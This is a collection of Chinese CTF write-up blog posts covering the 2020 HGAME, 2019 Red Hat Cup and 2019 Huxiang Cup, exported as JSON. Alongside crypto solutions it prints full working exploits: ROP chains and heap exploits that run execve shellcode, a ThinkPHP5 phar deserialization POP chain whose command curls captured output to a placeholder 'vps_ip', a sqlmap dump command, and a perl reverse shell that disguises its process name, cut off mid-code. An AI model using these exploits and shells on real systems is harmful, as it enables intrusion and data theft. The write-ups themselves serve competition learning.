[{"title":"2020 HGAME","date":"2020-02-04T16:00:00.000Z","path":"2020/02/05/2020HGAME/","text":"近期开始复习准备考研，连CTF打的都比较少了，刚好昨天星盟开始了新一轮的出题，遂练下手，但是今天不知道为什么出着出着就来补题了（摊手 WEEK1CRYPTOInfantRSA这道题挺简单的，直接就把pqe都给出来了123456789#!/usr/bin/env python3from secret import flagassert flag.startswith(b'hgame&#123;') and flag.endswith(b'&#125;')m = int.from_bytes(flag, byteorder='big')p = 681782737450022065655472455411q = 675274897132088253519831953441e = 13c = pow(m, e, p*q)assert c == 275698465082361070145173688411496311542172902608559859019841 exp如下1234567891011import gmpy2from Crypto.Util.number import long_to_bytesp = 681782737450022065655472455411q = 675274897132088253519831953441e = 13phi = (p-1)*(q-1)d = gmpy2.invert(e,phi)n = p*qc = 275698465082361070145173688411496311542172902608559859019841print long_to_bytes(pow(c,d,n))# hgame&#123;t3Xt6O0k_R5A!!!&#125; Affine一道简单的仿射密码题，因为范围不大，所以可以直接爆破求A和B，当然联立方程去求也是可以的，exp如下12345678910111213141516171819202122232425262728293031323334import gmpy2TABLE = 'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'MOD = len(TABLE)#这一步求A和Bflag = \"hgame\"for A in range(0xff): for B in range(0xff): cipher = '' for b in flag: i = TABLE.find(b) ii = (A*i+B)%MOD cipher += TABLE[ii] if(cipher=='A8I5z'): print A, B, cipher breakA = 13B = 14c = 'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'flag = ''cipher = \"A8I5z&#123;xr1A_J7ha_vG_TpH410&#125;\"for b in cipher: o = TABLE.find(b) if o==-1: flag += b continue for x in c: i = TABLE.find(x) ii = (A*i+B)%MOD now = TABLE[ii] if now==b: flag+=x breakprint flag not_One-time题目12345678910111213141516#!/usr/bin/env python3# -*- coding: utf-8 -*-import os, randomimport string, binascii, base64from secret import flagassert flag.startswith(b'hgame&#123;') and flag.endswith(b'&#125;')flag_len = len(flag)def xor(s1, s2): #assert len(s1)==len(s2) return bytes( map( (lambda x: x[0]^x[1]), zip(s1, s2) ) ) random.seed( os.urandom(8) )keystream = ''.join( [ random.choice(string.ascii_letters+string.digits) for _ in range(flag_len) ] )keystream = keystream.encode()print( base64.b64encode(xor(flag, keystream)).decode() ) nc一下能拿到这串东西1JTcLBwQzE3czQV8UPkoIYWtbVT4PYnB2CUFxUQEzVhw8IVYvR0cdZXUJTg== 看题目可以看到，首先随机生成8个字符的种子，然后再生成一串长度跟flag一样的字符串，把两个字符串异或一下再base64一下就是nc得到的值可以看到，题目用的是一次一密的加密方法，但是题目给的明文空间明显大于密文空间，所以可以用多组密文去进行攻击原理看这个：https://www.zhihu.com/question/26576521在这道题中，我们可以理解成keystream是不同的明文，而flag是相同的秘钥，每次都用不同的明文进行异或加密得到不同的密文，总结一下出来就是1234567假设我们现在有两条明文m1、m2，秘钥是k，密文是c1、c2，那么就有c1 = m1^kc2 = m2^kc1^c2 = (m1^k)^(m2^k) = m1^m2可以看到，我们不知道明文是什么，但是可以通过这个关系反推出部分明文而同样有一个需要注意的就是，如果得出来的c1^c2是英文字符的话，m1很大可能是个英文字符，m2为空格所以，如果我们的秘钥数足够多的话，就可以一位位爆破出k值，进而得到flag了","comments":true,"permalink":"https://xi4or0uji.github.io/2020/02/05/2020HGAME/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2019红帽杯wp","date":"2019-11-11T16:00:00.000Z","path":"2019/11/12/2019红帽杯wp/","text":"前言上个周末打了个红帽杯，题目还是一如既往地难，菜鸡还是一如既往地菜Orz，放下队内wp PWNthree静态编译文件，开了NX有一个3字节的shellcode可以操作；在Tell me的时候写入ropchain，再执行shellcode跳转到0x80f6cc0执行ropchainexp如下12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#!/usr/bin/env python2# execve generated by ROPgadgetfrom struct import pack# Padding goes herep = ''p += pack('&lt;I', 0x08072f8b) # pop edx ; retp += pack('&lt;I', 0x080f5000) # @ .datap += pack('&lt;I', 0x080c11e6) # pop eax ; retp += '/bin'p += pack('&lt;I', 0x080573e5) # mov dword ptr [edx], eax ; retp += pack('&lt;I', 0x08072f8b) # pop edx ; retp += pack('&lt;I', 0x080f5004) # @ .data + 4p += pack('&lt;I', 0x080c11e6) # pop eax ; retp += '//sh'p += pack('&lt;I', 0x080573e5) # mov dword ptr [edx], eax ; retp += pack('&lt;I', 0x08072f8b) # pop edx ; retp += pack('&lt;I', 0x080f5008) # @ .data + 8p += pack('&lt;I', 0x080569a0) # xor eax, eax ; retp += pack('&lt;I', 0x080573e5) # mov dword ptr [edx], eax ; retp += pack('&lt;I', 0x080481d9) # pop ebx ; retp += pack('&lt;I', 0x080f5000) # @ .datap += pack('&lt;I', 0x08072fb2) # pop ecx ; pop ebx ; retp += pack('&lt;I', 0x080f5008) # @ .data + 8p += pack('&lt;I', 0x080f5000) # padding without overwrite ebxp += pack('&lt;I', 0x08072f8b) # pop edx ; retp += pack('&lt;I', 0x080f5008) # @ .data + 8p += pack('&lt;I', 0x080569a0) # xor eax, eax ; retp += pack('&lt;I', 0x0808041a) # inc eax ; retp += pack('&lt;I', 0x0808041a) # inc eax ; retp += pack('&lt;I', 0x0808041a) # inc eax ; retp += pack('&lt;I', 0x0808041a) # inc eax ; retp += pack('&lt;I', 0x0808041a) # inc eax ; retp += pack('&lt;I', 0x0808041a) # inc eax ; retp += pack('&lt;I', 0x0808041a) # inc eax ; retp += pack('&lt;I', 0x0808041a) # inc eax ; retp += pack('&lt;I', 0x0808041a) # inc eax ; retp += pack('&lt;I', 0x0808041a) # inc eax ; retp += pack('&lt;I', 0x0808041a) # inc eax ; retp += pack('&lt;I', 0x08049903) # int 0x80from pwn import *context.log_level = 'debug'# io = process('./pwn')io = remote(\"47.104.190.38\",\"12001\")sd = lambda s:io.send(s)sl = lambda s:io.sendline(s)rc = lambda s:io.recv(s)ru = lambda s:io.recvuntil(s)sda = lambda a,s:io.sendafter(a,s)sla = lambda a,s:io.sendlineafter(a,s)ru(\"index:\\n\")sl('0')ru(\"much!\\n\")sl(\"\\x89\\xcc\\xc3\")ru(\"size:\\n\")sl(str(0x200))ru(\"me:\\n\")# gdb.attach(io,\"b *0x8048C50\")sl(p)io.interactive() REeasyRE一开始被坑了，base64一直解密出来一个网站，发现找不到flag，后来想到第一个输入的hint是找flag头，于是一个个找，发现了真正的主逻辑：先通过flag字符和table前四个数异或解出key，这里把table和key字符异或就可出了：1234567cc = \"\"t = [0x40, 0x35, 0x20, 0x56, 0x5D, 0x18, 0x22, 0x45, 0x17, 0x2F, 0x24, 0x6E, 0x62, 0x3C, 0x27, 0x54, 0x48, 0x6C, 0x24, 0x6E, 0x72, 0x3C, 0x32, 0x45,0x5B]key = 0x26594131k = [0x26,0x59,0x41,0x31]for j in range(len(t)): cc += chr(t[j] ^ k[j % 4])print cc xx这题一共3关，第一关xxtea，根据输入是完整格式flag{xxxxxxxxxxxx}，而key是取了输入的前4字节，所以可以动态调试，可以提取出key就是flag\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00，知道密文即可解密出来；第二关是置换这个简单，第三关是迭代异或，这里动态调试跟汇编得到计算过程：接着有个cmp的比较，所以我们知道密文，可以逆向解迭代异或，再置换，再xxtea解密即可得到flag1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#coding=utf8import structmessage = '\\xbc\\xa5\\xce\\x40\\xf4\\xb2\\xb2\\xe7\\xa9\\x12\\x9d\\x12\\xae\\x10\\xc8\\x5b\\x3d\\xd7\\x06\\x1d\\xdc\\x70\\xf8\\xdc'key = \"flag\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" data = 0x9E3779B9 def _long2str(v, w): n = (len(v) - 1) &lt;&lt; 2 if w: m = v[-1] if (m &lt; n - 3) or (m &gt; n): return '' n = m s = struct.pack('&lt;%iL' % len(v), *v) return s[0:n] if w else s def _str2long(s, w): n = len(s) m = (4 - (n &amp; 3) &amp; 3) + n s = s.ljust(m, \"\\x00\") v = list(struct.unpack('&lt;%iL' % (m &gt;&gt; 2), s)) if w: v.append(n) return v def decrypt(str, key): if str == '': return str v = _str2long(str, False) k = _str2long(key.ljust(16, \"\\x00\"), False) n = len(v) - 1 z = v[n] y = v[0] q = 6 + 52 // (n + 1) sum = (q * data) &amp; 0xffffffff while (sum != 0): e = sum &gt;&gt; 2 &amp; 3 for p in xrange(n, 0, -1): z = v[p - 1] v[p] = (v[p] - ((z &gt;&gt; 5 ^ y &lt;&lt; 2) + (y &gt;&gt; 3 ^ z &lt;&lt; 4) ^ (sum ^ y) + (k[p &amp; 3 ^ e] ^ z))) &amp; 0xffffffff y = v[p] z = v[n] v[0] = (v[0] - ((z &gt;&gt; 5 ^ y &lt;&lt; 2) + (y &gt;&gt; 3 ^ z &lt;&lt; 4) ^ (sum ^ y) + (k[0 &amp; 3 ^ e] ^ z))) &amp; 0xffffffff y = v[0] sum = (sum - data) &amp; 0xffffffff return _long2str(v, True) if __name__ == \"__main__\": flag = decrypt(message,key) print flag childRE直接分析主逻辑这题有3关，第一关对输入进行了一个排序算法，这个好逆，第二关是把排完序的字符串进行了一个函数名扩展修饰，使得31位的输入变成了62位，再进行了一个简单的check(这里直接爆破即可)123456789101112131415string = []k = 0for m in range(62): for i in range(1000): k = i % 23 p = i / 23 if table[p]==a[m]: if table[k]==b[m]: string.append(i) breaku = ''for i in string: u += chr(i)print u#\"private: char * __thiscall R0Pxx::My_Aut0_PWN(unsigned char *)\" 难点在于那个C++的函数名修饰扩展，这个自学了一波，写了个还原成未修饰的字符的程序12345678910111213141516171819202122#include &lt;iostream&gt;using namespace std;class R0Pxx &#123;public: R0Pxx(int val) &#123; unsigned char a = 0x41; My_Aut0_PWN(&amp;a); &#125;private: char* __thiscall My_Aut0_PWN(unsigned char* a) &#123; cout &lt;&lt; \"hello !\"; printf(\"Decorated function name: %s\\n\", __FUNCDNAME__); printf(\"Function signature: %s\\n\", __FUNCSIG__); return 0; &#125;;&#125;;int main() &#123; R0Pxx ropxx(1); return 0;&#125; 得到了排序后的字符：”?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z”，排序算法直接用小技巧：kk = “0123456789abcdefghijklmnopqrstu”，gg = “fg7hi83jk9lma41nobpqc5rsdtue620”就可知道原来字符的位置，所以直接替换位置既可得到：Z0@tRAEyuP@xAAA?M_A0_WNPx@@EPDP最后MD5加密下得到flag：flag{63b148e750fed3a33419168ac58083f5} calc这题作者自己实现了一个大数运算，有3次输入，每次输入一个大整数，既可得到flag，然后通过调试和分析可以得到搞出关键性的check，前面的计算没有用到，白分析了哎，直接看分析出来的关键性check1((input1 + input2) * (input1 + input2) * (input1 + input2) - 3 * input1 * input2 * input2 - 3 * input2 * input1 * input1 == ((4 + input3) * (4 + input3) * (4 + input3) - (input3 * input3) * 12 - 48 * input3 - 22)) 我们用x1，x2和x3表示3个输入，然后化简得到1(x1+x2)^3-3*x1x2x3-3*x2*x1^2==(4+x3)^3-12*x3^2-48*x3-22 将3次幂拆分成2次幂，然后再化简约去同类项可得：x1^3 + x2^3 +(-x3)^3 = 42，这里一开始用z3跑，用symp都跑不出来，申请写了3个for循环爆破，但是都出不了，后面上网谷歌，找到一篇文章:：https://zhuanlan.zhihu.com/p/81655767所以直接得到3个数：123x1= 80435758145817515x2=12602123297335631x3= 80538738812075974 输入程序最后拿到flag：flag{951e27be2b2f10b7fa22a6dc8f4682bd} WEBticket_system首先有个xxe注入的地方，利用postXML去读源文件把源文件和readflag文件读下来以后可以分析出，攻击过程是上传一个可执行的php，通过thinkphp5的pop链和phar去触发反序列化漏洞readflag文件和*ctf那题一模一样，直接拿当初的脚本就行了123456789101112131415161718192021222324&lt;?php$descriptorspec = array( 0 =&gt; array(\"pipe\", \"r\"), 1 =&gt; array(\"pipe\", \"w\"), 2 =&gt; array(\"file\", \"/tmp/error-output.txt\", \"a\"));$process = proc_open('/readflag', $descriptorspec, $pipes, $cwd, $env);if (is_resource($process)) &#123; $question = fread($pipes[1],1024); $question = fread($pipes[1],1024); $question = trim($question); echo $question; eval('$result = '.$question.';'); fwrite($pipes[0], $result); fclose($pipes[0]); $flag = fread($pipes[1],1024); $flag = fread($pipes[1],1024); $flag = fread($pipes[1],1024); echo $flag; fclose($pipes[1]); $return_value = proc_close($process); echo $return_value;&#125;?&gt; 上传过去以后拿微笑师傅的pop链打过去12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?phpnamespace think\\process\\pipes &#123; class Windows &#123; private $files; public function __construct($files) &#123; $this-&gt;files = array($files); &#125; &#125;&#125;namespace think\\model\\concern &#123; trait Conversion &#123; protected $append = array(\"Smi1e\" =&gt; \"1\"); &#125; trait Attribute &#123; private $data; private $withAttr = array(\"Smi1e\" =&gt; \"system\"); public function get($system) &#123; $this-&gt;data = array(\"Smi1e\" =&gt; \"$system\"); &#125; &#125;&#125;namespace think &#123; abstract class Model &#123; use model\\concern\\Attribute; use model\\concern\\Conversion; &#125;&#125;namespace think\\model&#123; use think\\Model; class Pivot extends Model &#123; public function __construct($system) &#123; $this-&gt;get($system); &#125; &#125;&#125;namespace &#123; $Conver = new think\\model\\Pivot(\"curl http://vps_ip:2334/ -d `php /tmp/uploads/0cc175b9c0f1b6a831c399e269772661/20191111/6582f47189690b9acfc01cc069af8ea8.xml|tac|tr -d \\\"\\\\n\\\"|sed 's/ //g'`;\"); $payload = new think\\process\\pipes\\Windows($Conver); @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub $phar-&gt;setMetadata($payload); //将自定义的meta-data存入manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); echo urlencode(serialize($payload));&#125; easyweb找xyhcms源码挖洞1sqlmap.py -u http//xxx/index.php?s=api/lt/gbooklist&amp;orderby=* --technique=B --tamper between -D xyhcms -T fl4g -C flaag --dump MISC签到填个问卷就行 Advertising for Marriage首先是浏览文件，然后看到有张vegetable.png把这张图片dump下来以后在linux里面是打不开的，提示CRC错误，通过CRC码爆破出高度是D3在notepad里面看到一段hint然后图片去模糊出来的不是对的flag，到这里似乎卡住了，放去stego看一下，每个RGB通道都有一段干扰的信息，猜测是lsb隐写那秘钥是什么呢，估计是前面的hint那段，剩下的就是找前四个是什么字母了再继续看进程看见有个画图进程把它dump下来用gimp打开看到是接下来就是lsb恢复加密的数据（这里吐槽一波出题人英语不好，friend打错了，结果弄了一个晚上才发现是错的….dbq或许他不缺女朋友base64解密以后提示维吉尼亚，gnxtmwg7r1417psedbs62587h0，密钥：bcxneedmoneyandgirlfirend，解密就能得到flag：d7f1417bfafbf62587e0 恶臭的数据包拿到数据包发现全是wifi加密的流量，马上想到1aircrack-ng cacosmia.cap 发现数据包网路名称是mamawoxiangwantiequan，然后想到爆破八位的wifi密码提取原包，本来生成了个700多m的字典去爆，发现要10h就直接顺手先试试弱密码12345678，解出源包cacosmia-dec.cap然后提取http协议传输的文件，binwalk最大那个发现一张图和一个加密压缩包，找到传压缩包的tcp流，发现cookie中JWT有hint，压缩包密码是ping的网址过滤dns协议网址，一个个试，找到最后一个就是密码解压出flag，flag{f14376d0-793e-4e20-9eab-af23f3fdc158} CRYPTOboardcast出题人失误，源文件直接放了flag剩下的密码学好难啊，只能等大佬们的wp复现了","comments":true,"permalink":"https://xi4or0uji.github.io/2019/11/12/2019红帽杯wp/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2019湖湘杯wp","date":"2019-11-09T16:00:00.000Z","path":"2019/11/10/2019湖湘杯wp/","text":"前言这次的湖湘杯py真的是太严重了，原题杯可还行，8-81同分可还行（摊手放一个逼乎上看到的段子在湖湘杯复赛上，主持人突然问：我们这里有没有很菜的战队？一个人回答：有，是答主那个。”主持人问：为什么他们是很菜的队？回答：我发现最后一个小时，只有他们一个队没有直线上分！”还是继续放一波队内wp CRYPTOgive me your passport看源码看到只有提交的字符串解密以后是Admin就给flag，服务器文件就是加密文件，改一下name跑出来字符串交上去就行 rsa有一说一，没啥好解释的，很常见的攻击，GitHub上也有脚本https://github.com/Zui-Qing-Feng/RSA/blob/master/%E5%B7%B2%E7%9F%A5e%2Cn%2Cdp%2Cc%E6%B1%82m1234567891011121314151617import libnumfrom Crypto.Util.number import long_to_bytesdp = 84373069210173690047629226878686144017052129353931011112880892379361035492516066159394115482289291025932915787077633999791002846189004408043685986856359812230222233165493645074459765748901898518115384084258143483508823079115319711227124403284267559950883054402576935436305927705016459382628196407373896831725n = 22000596569856085362623019573995240143720890380678581299411213688857584612953014122879995808816872221032805734151343458921719334360194024890377075521680399678533655114261000716106870610083356478621445541840124447459943322577740268407217950081217130055057926816065068275999620502766866379465521042298370686053823448099778572878765782711260673185703889168702746195779250373642505375725925213796848495518878490786035363094086520257020021547827073768598600151928787434153003675096254792245014217044607440890694190989162318846104385311646123343795149489946251221774030484424581846841141819601874562109228016707364220840611e = 65537c = 14874271064669918581178066047207495551570421575260298116038863877424499500626920855863261194264169850678206604144314318171829367575688726593323863145664241189167820996601561389159819873734368810449011761054668595565217970516125181240869998009561140277444653698278073509852288720276008438965069627886972839146199102497874818473454932012374251932864118784065064885987416408142362577322906063320726241313252172382519793691513360909796645028353257317044086708114163313328952830378067342164675055195428728335222242094290731292113709866489975077052604333805889421889967835433026770417624703011718120347415460385182429795735for i in range(1,65538): if (dp*e-1)%i == 0: if n%(((dp*e-1)/i)+1)==0: p=((dp*e-1)/i)+1 q=n/(((dp*e-1)/i)+1) phi = (p-1)*(q-1) d = libnum.invmod(e,phi)%phi m = pow(c,d,n) print long_to_bytes(m) Des子秘钥反推出deskey，剩下的吹一波主办方123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111import libnumimport binasciiimport pyDesimport base64key1 = [1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0]__pc2 = [ 13, 16, 10, 23, 0, 4, 2, 27, 14, 5, 20, 9, 22, 18, 11, 3, 25, 7, 15, 6, 26, 19, 12, 1, 40, 51, 30, 36, 46, 54, 29, 39, 50, 44, 32, 47, 43, 48, 38, 55, 33, 52, 45, 41, 49, 35, 28, 31 ]C1D1 = ['*']*56for i in range(0,len(key1)): C1D1[__pc2[i]] = key1[i]# print C1D1C1 = '00000001*11111100*110*00*000'D1 = '011001*01*1101*0001011000*01'C0 = '000000001*11111100*110*00*00'D0 = '1011001*01*1101*0001011000*0'__pc1 = [56, 48, 40, 32, 24, 16, 8, 0, 57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18, 10, 2, 59, 51, 43, 35, 62, 54, 46, 38, 30, 22, 14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 60, 52, 44, 36, 28, 20, 12, 4, 27, 19, 11, 3 ]C0D0 = C0+D0res = ['*']*64deskey = \"\"for i in range(0,len(__pc1)): res[__pc1[i]] = C0D0[i]for i in res: deskey += i# print deskey#01000***01**111*0100100*0110010*0110111*01*00*1*0*0*010*1100001*#01000***01**111*0100100*0110010*0110111*01*00*1*0*0*010*0100001*def zuoyiwei(str,num): my = str[num:len(str)] my = my+str[0:num] return mydef key_change_1(str): key1_list = [57,49,41,33,25,17,9,1,58,50,42,34,26,18,10,2,59,51,43,35,27,19,11,3,60,52,44,36,63,55,47,39,31,23,15,7,62,54,46,38,30,22,14,6,61,53,45,37,29,21,13,5,28,20,12,4] res = \"\" for i in key1_list: res+=str[i-1] return resdef key_change_2(str): key2_list = [14,17,11,24,1,5,3,28,15,6,21,10,23,19,12,4,26,8,16,7,27,20,13,2,41,52,31,37,47,55,30,40,51,45,33,48,44,49,39,56,34,53,46,42,50,36,29,32] res = \"\" for i in key2_list: res+=str[i-1] return resdef key_gen(str): key_list = [] key_change_res = key_change_1(str) key_c = key_change_res[0:28] key_d = key_change_res[28:] for i in range(1,17): if (i==1) or (i==2) or (i==9) or (i==16): key_c = zuoyiwei(key_c,1) key_d = zuoyiwei(key_d,1) else: key_c = zuoyiwei(key_c,2) key_d = zuoyiwei(key_d,2) key_yiwei = key_c+key_d key_res = key_change_2(key_yiwei) key_list.append(key_res) return key_listdeskey = \"01000abc01de111f0100100g0110010h0110111i01j00k1l0m0n010o0100001p\"# print key_gen(deskey)# deskey = \"0100000\"+c+\"0110111\"+f+\"0100100\"+g+\"0110010\"+h+\"0110111\"+i+\"0110011\"+l+\"0100010\"+o+\"1100001\"+pdeskey = \"0100000c0110111f0100100g0110010h0110111i0110011l0100010o0100001p\"def bintostr(str): res = \"\" for i in range(0,len(str),8): res += chr(int(str[i:i+8],2)) return resfor c in \"01\": for f in \"01\": for g in \"01\": for h in \"01\": for i in \"01\": for L in \"01\": for o in \"01\": for p in \"01\": str = '0100000'+c+'0110111'+f+'0100100'+g+'0110010'+h+'0110111'+i+'0110011'+L+'0100010'+o+'0100001'+p str = bintostr(str) print strDES = pyDes.des(\"AnHengDB\")DES.setMode('ECB')cipher_list= \"gAN5RT1XWKI0OyUayZj35SlKQ+if2PAJ\"cipher_list = base64.b64decode(cipher_list)print DES.decrypt(cipher_list)+\"AnHengDB\" PWNHackNote这题什么保护也没有开，分析程序发现是常见的菜单题漏洞点在于edit函数会计算输入的字符个数作为下一次edit的size，这里只要申请时0xx8形式的大小，这样就会连着下一个chunk的size，因为计算时看0截断的，也就是说size会被算进去，实现offbyone的漏洞，就可以利用overlapchunk的操作，通过堆块重叠实现UAF，2次fastbin的attack，第一次往bss中写入shellcode，第二次我们fastbin_attack劫持到fini.array，在里面写shellcode的地址，最后退出，即可执行shellcode去getshell，下面是exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#coding=utf8from pwn import *context.log_level = 'debug'context(arch='amd64', os='linux')local = 1elf = ELF('./HackNote')if local: p = process('./HackNote') libc = elf.libcelse: p = remote('183.129.189.62',10204) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')shellcode64 = '\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\xb0\\x3b\\x0f\\x05'sl = lambda s : p.sendline(s)sd = lambda s : p.send(s)rc = lambda n : p.recv(n)ru = lambda s : p.recvuntil(s)ti = lambda : p.interactive()def debug(addr,PIE=True): if PIE: text_base = int(os.popen(\"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'\".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,\"b *&#123;&#125;\".format(hex(addr)))def bk(addr): gdb.attach(p,\"b *\"+str(hex(addr)))def malloc(size,content): ru(\"4. Exit\\n\") ru(\"-----------------\\n\") sl('1') ru(\"Input the Size:\\n\") sl(str(size)) ru(\"Input the Note:\\n\") sl(content)def free(index): ru(\"4. Exit\\n\") ru(\"-----------------\\n\") sl('2') ru(\"Input the Index of Note:\\n\") sl(str(index))def edit(index,content): ru(\"4. Exit\\n\") ru(\"-----------------\\n\") sl('3') ru(\"Input the Index of Note:\\n\") sl(str(index)) ru(\"Input the Note:\\n\") sd(content)malloc(0x98,'a'*0x98)#0malloc(0x38,'a'*0x98)#1malloc(0x38,'a'*0x98)#2malloc(0x98,'a'*0x98)#3malloc(0x98,'a'*0x98)#4malloc(0x98,'a'*0x98)#5malloc(0x98,'a'*0x98)#6py = ''py += 'a'*0x98edit(3,py)py = ''py += 'a'*0x90py += p64(0x1c0) + '\\xa0'edit(3,py)free(0)free(4)malloc(0x98,'i'*0x98)malloc(0x38,'b'*0x38)malloc(0x38,'h'*0x38)# bk(0)free(1)edit(4,p64(0x6caed2)+'\\n')malloc(0x38,'a'*0x38)ret_addr = 0x6ccbb8py = '\\x40' + '\\x00'*5 + '\\x00'*8 + p64(ret_addr+0x10)malloc(0x38,py)free(2)edit(7,p64(0x6ccbb8)+'\\n')malloc(0x38,'a'*0x38)malloc(0x38,shellcode64+'\\n')ru(\"4. Exit\\n\")ru(\"-----------------\\n\")sl('4')p.interactive() NameSystem这道题直接分析可以知道，pie没开，got表可改，ida分析一波常规的菜单题，漏洞点在free函数这里申请20个堆块，free第19个堆块，就会把20堆块的地址给19，这样有2个20堆块的地址，可以构造出double free了，我们构造出2条double free的链子，一条用来改free的got为printf_plt，格式化字符串泄露出真实地址，另外一条改printf的got为onegadget，最后show一下既可以getshell了，exp如下1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889#coding=utf8from pwn import *context.log_level = 'debug'context(arch='amd64', os='linux')local = 0elf = ELF('./NameSystem')if local: p = process('./NameSystem') libc = elf.libcelse: p = remote('183.129.189.62',12905) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')shellcode64 = '\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\xb0\\x3b\\x0f\\x05'sl = lambda s : p.sendline(s)sd = lambda s : p.send(s)rc = lambda n : p.recv(n)ru = lambda s : p.recvuntil(s)ti = lambda : p.interactive()def debug(addr,PIE=True): if PIE: text_base = int(os.popen(\"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'\".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,\"b *&#123;&#125;\".format(hex(addr)))def bk(addr): gdb.attach(p,\"b *\"+str(hex(addr)))def malloc(size,content): ru(\"Your choice :\") sl('1') ru(\"Name Size:\") sl(str(size)) ru(\"Name:\") sl(content)def free(index): ru(\"Your choice :\") sl('3') ru(\"The id you want to delete:\") sl(str(index))for i in range(17): malloc(0x10,'a'*0x60)for i in range(3): malloc(0x50,'b'*0x60)size1 = 0x601ffasize2 = 0x602022puts_plt = elf.sym[\"puts\"]free_got = elf.sym[\"free\"]puts_got = elf.got[\"puts\"]print_plt = 0x0000000004006D0free(18)free(18)free(17)free(19)for i in range(17): free(0)for i in range(14): malloc(0x20,'c'*0x20)malloc(0x30,'d'*0x30)malloc(0x30,'d'*0x30)malloc(0x30,'d'*0x30)malloc(0x30,'d'*0x30)free(18)free(18)free(17)free(19)for i in range(14): free(2)malloc(0x50,p64(size1))malloc(0x50,p64(size1))malloc(0x50,p64(size1))malloc(0x50,'\\x00'*14 + '\\xd0\\x06\\x40\\x00\\x00')malloc(0x60,\"%13$p\")free(9)one = [0x45216,0x4526a,0xf02a4,0xf1147]libc_base = int(rc(14),16)-0x20830print \"libc_addr---&gt;\" + hex(libc_base)onegadget = libc_base + one[0]malloc(0x30,p64(size2))malloc(0x30,p64(size2))malloc(0x30,p64(size2))malloc(0x30,'\\x00'*6 + p64(onegadget))ru(\"Your choice :\")sl('2')p.interactive() WEBuntar这题和2017hitcon的ssrfme很相似，就是条件苛刻了一点先上个perl后门123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#!/usr/bin/perl -w# perl-reverse-shell - A Reverse Shell implementation in PERLuse strict;use Socket;use FileHandle;use POSIX;my $VERSION = \"1.0\";# Where to send the reverse shell. Change these.my $ip = 'vps_ip';my $port = 2333;# Optionsmy $daemon = 1;my $auth = 0; # 0 means authentication is disabled and any # source IP can access the reverse shellmy $authorised_client_pattern = qr(^127\\.0\\.0\\.1$);# Declarationsmy $global_page = \"\";my $fake_process_name = \"/usr/sbin/apache\";# Change the process name to be less conspicious$0 = \"[httpd]\";# Authenticate based on source IP address if requiredif (defined($ENV&#123;'REMOTE_ADDR'&#125;)) &#123; cgiprint(\"Browser IP address appears to be: $ENV&#123;'REMOTE_ADDR'&#125;\"); if ($auth) &#123; unless ($ENV&#123;'REMOTE_ADDR'&#125; =~ $authorised_client_pattern) &#123; cgiprint(\"ERROR: Your client isn't authorised to view this page\"); cgiexit(); &#125; &#125;&#125; elsif ($auth) &#123; cgiprint(\"ERROR: Authentication is enabled, but I couldn't determine your IP address. Denying access\"); cgiexit(0);&#125;# Background and dissociate from parent process if requiredif ($daemon) &#123; my $pid = fork(); if ($pid) &#123; cgiexit(0); # parent exits &#125; setsid(); chdir('/'); umask(0);&#125;# Make TCP connection for reverse shellsocket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123; cgiprint(\"Sent reverse shell to $ip:$port\"); cgiprintpage();&#125; else &#123; cgiprint(\"Couldn't open reverse shell to $ip:$port: $!\"); cgiexit(); &#125;# Redirect STDIN, STDOUT and STDERR to the TCP connectionopen(STDIN, 